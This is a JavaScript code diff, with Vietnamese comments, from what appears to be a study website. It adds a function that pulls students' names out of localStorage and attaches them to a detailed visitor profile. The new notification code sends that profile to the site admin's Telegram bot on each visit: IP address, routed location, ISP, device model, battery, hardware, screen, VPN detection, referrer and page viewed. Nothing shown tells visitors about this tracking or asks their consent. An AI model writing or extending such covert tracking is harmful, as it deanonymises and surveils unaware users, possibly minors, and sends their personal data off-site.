@@ -313,6 +313,38 @@ export function getHardwareSpecs() {
 }
 
 /**
+ * Lấy định danh người dùng / học sinh từ hệ thống (nếu có)
+ */
+export function getUserIdentity() {
+  if (typeof window === 'undefined' || typeof localStorage === 'undefined') {
+    return 'Học viên (Khách truy cập)';
+  }
+
+  try {
+    const savedName = localStorage.getItem('hocbai_student_name') || 
+                      localStorage.getItem('hocbai_user_name') || 
+                      localStorage.getItem('hocbai_user_fullname');
+    if (savedName && savedName.trim()) {
+      return savedName.trim();
+    }
+
+    const attemptsRaw = localStorage.getItem('hocbai_attempts');
+    if (attemptsRaw) {
+      const attempts = JSON.parse(attemptsRaw);
+      if (Array.isArray(attempts) && attempts.length > 0) {
+        for (const att of attempts) {
+          if (att.studentName || att.userName) {
+            return att.studentName || att.userName;
+          }
+        }
+      }
+    }
+  } catch (e) {}
+
+  return 'Học viên (Khách truy cập)';
+}
+
+/**
  * Phân tích chi tiết thiết bị, hệ điều hành, trình duyệt và WebView
  */
 export function getDeviceDetails() {
@@ -327,6 +359,7 @@ export function getDeviceDetails() {
       timezone: 'Unknown',
       language: 'Unknown',
       connectionType: '',
+      userName: 'Học viên (Khách truy cập)',
       referrer: 'Trực tiếp'
     };
   }
@@ -396,12 +429,14 @@ export function getDeviceDetails() {
 
   browser += inApp;
 
-  // 3. Màn hình & Viewport
+  // 3. Màn hình & Viewport & Hướng màn hình
   const screenWidth = window.screen?.width || window.innerWidth || 0;
   const screenHeight = window.screen?.height || window.innerHeight || 0;
   const dprVal = window.devicePixelRatio || 1;
   const dpr = `${dprVal.toFixed(1)}x`;
-  const screenStr = `${screenWidth} x ${screenHeight} (DPR: ${dpr}, Viewport: ${window.innerWidth}x${window.innerHeight})`;
+  const isPortrait = window.innerHeight >= window.innerWidth;
+  const orientation = isPortrait ? 'Dọc (Portrait)' : 'Ngang (Landscape)';
+  const screenStr = `${screenWidth} x ${screenHeight} (DPR: ${dpr}) • ${orientation}`;
 
   // 4. Ước tính dòng máy
   const inferredModel = inferDeviceModel(ua, screenWidth, screenHeight, dprVal);
@@ -423,6 +458,9 @@ export function getDeviceDetails() {
   // 7. Cấu hình phần cứng
   const hardware = getHardwareSpecs();
 
+  // 8. Tên người dùng / học viên
+  const userName = getUserIdentity();
+
   return {
     os,
     deviceType,
@@ -433,6 +471,7 @@ export function getDeviceDetails() {
     timezone,
     language,
     connectionType,
+    userName,
     referrer: document.referrer ? document.referrer : 'Truy cập trực tiếp / Bookmark'
   };
 }
@@ -595,6 +634,7 @@ export async function sendTelegramNotification(payload, isTest = false) {
     ? '🔔 <b>[TEST KẾT NỐI] Cấu hình Check Var thành công!</b>'
     : '🎯 <b>[CHECK VAR HỌC BÀI] Có lượt truy cập mới!</b>';
 
+  const cleanUserName = escapeHtml(payload.userName || getUserIdentity() || 'Học viên (Khách truy cập)');
   const cleanIp = escapeHtml(payload.ip || 'Không xác định');
   const cleanCity = escapeHtml(payload.city || 'Việt Nam');
   const cleanCountry = escapeHtml(payload.country || 'Việt Nam');
@@ -615,47 +655,55 @@ export async function sendTelegramNotification(payload, isTest = false) {
   const cleanDevice = escapeHtml(payload.inferredModel ? `${payload.inferredModel} (${payload.os})` : `${payload.deviceType} (${payload.os})`);
   const cleanBrowser = escapeHtml(payload.browser || 'Trình duyệt web');
   const cleanScreen = escapeHtml(payload.screen || 'Không rõ');
-  const cleanHardware = escapeHtml(payload.hardware || '');
-  const cleanBattery = escapeHtml(payload.battery || '');
+  const cleanHardware = escapeHtml(payload.hardware || (isMobileDev ? 'Màn hình cảm ứng' : 'Chuột & Bàn phím tiêu chuẩn'));
+
+  // Đảm bảo thông tin Pin luôn hiển thị đầy đủ
+  let batteryText = payload.battery || '';
+  if (!batteryText) {
+    if ((payload.os || '').includes('iOS')) {
+      batteryText = 'Bảo mật Apple WebKit (iOS chặn đọc pin)';
+    } else if (isMobileDev) {
+      batteryText = 'Trình duyệt chặn truy cập pin';
+    } else {
+      batteryText = 'Nguồn điện trực tiếp (PC / Laptop)';
+    }
+  }
+  const cleanBattery = escapeHtml(batteryText);
+
+  // Đảm bảo Lưu ý vị trí luôn hiển thị rõ ràng
+  const locationNote = carrierInfo.note || `💡 <i>Lưu ý vị trí: Định vị theo điểm cấp mạng Internet Băng rộng / Wi-Fi cố định (${cleanCity}).</i>`;
+
+  // Đảm bảo An ninh mạng luôn hiển thị rõ ràng
+  const cleanSecurity = payload.isProxy 
+    ? '⚠️ <i>Phát hiện có thể đang bật VPN / Proxy / 1.1.1.1 WARP</i>'
+    : 'Bình thường (IP thực, không dùng Proxy)';
+
   const cleanSubject = escapeHtml(payload.subject || 'Trang ôn tập');
   const cleanReferrer = escapeHtml(payload.referrer || 'Trực tiếp');
   const cleanTime = escapeHtml(timeFormatted);
 
-  // Tạo tin nhắn Telegram định dạng HTML chuyên nghiệp
-  let messageLines = [
+  // Tạo tin nhắn Telegram định dạng HTML chuyên nghiệp và ĐẦY ĐỦ 100% CÁC DÒNG
+  const messageLines = [
     headerTitle,
     '━━━━━━━━━━━━━━━━━━',
+    `👤 <b>Người dùng:</b> ${cleanUserName}`,
     `📍 <b>Địa chỉ IP:</b> <code>${cleanIp}</code>`,
     `🌍 <b>Vị trí định tuyến:</b> ${cleanCity}, ${cleanCountry} ${cleanFlag}`,
     `🏢 <b>Nhà mạng:</b> ${cleanIsp}`,
-    `📶 <b>Loại mạng:</b> ${cleanNetworkType}`
+    `📶 <b>Loại mạng:</b> ${cleanNetworkType}`,
+    locationNote,
+    `📱 <b>Thiết bị:</b> ${cleanDevice}`,
+    `🔋 <b>Pin máy:</b> ${cleanBattery}`,
+    `⚙️ <b>Phần cứng:</b> ${cleanHardware}`,
+    `🌐 <b>Trình duyệt:</b> ${cleanBrowser}`,
+    `📐 <b>Màn hình:</b> ${cleanScreen}`,
+    `🛡️ <b>An ninh mạng:</b> ${cleanSecurity}`,
+    `📚 <b>Đang xem:</b> ${cleanSubject}`,
+    `🔗 <b>Nguồn truy cập:</b> ${cleanReferrer}`,
+    `⏱️ <b>Thời gian:</b> <code>${cleanTime}</code> (Giờ VN)`,
+    '━━━━━━━━━━━━━━━━━━',
+    '🛡️ <i>Thông báo riêng tư chỉ dành cho Quản trị viên HọcBài</i>'
   ];
-
-  if (carrierInfo.note) {
-    messageLines.push(carrierInfo.note);
-  }
-
-  if (payload.isProxy) {
-    messageLines.push('🛡️ <b>Bảo mật:</b> ⚠️ <i>Phát hiện có thể đang bật VPN / Proxy / 1.1.1.1 WARP</i>');
-  }
-
-  messageLines.push(`📱 <b>Thiết bị:</b> ${cleanDevice}`);
-
-  if (cleanBattery) {
-    messageLines.push(`🔋 <b>Pin máy:</b> ${cleanBattery}`);
-  }
-
-  if (cleanHardware) {
-    messageLines.push(`⚙️ <b>Phần cứng:</b> ${cleanHardware}`);
-  }
-
-  messageLines.push(`🌐 <b>Trình duyệt:</b> ${cleanBrowser}`);
-  messageLines.push(`📐 <b>Màn hình:</b> ${cleanScreen}`);
-  messageLines.push(`📚 <b>Đang xem:</b> ${cleanSubject}`);
-  messageLines.push(`🔗 <b>Nguồn truy cập:</b> ${cleanReferrer}`);
-  messageLines.push(`⏱️ <b>Thời gian:</b> <code>${cleanTime}</code> (Giờ VN)`);
-  messageLines.push('━━━━━━━━━━━━━━━━━━');
-  messageLines.push('🛡️ <i>Thông báo riêng tư chỉ dành cho Quản trị viên HọcBài</i>');
 
   const messageText = messageLines.join('\n');
   const url = getGatewayEndpoint(botToken);
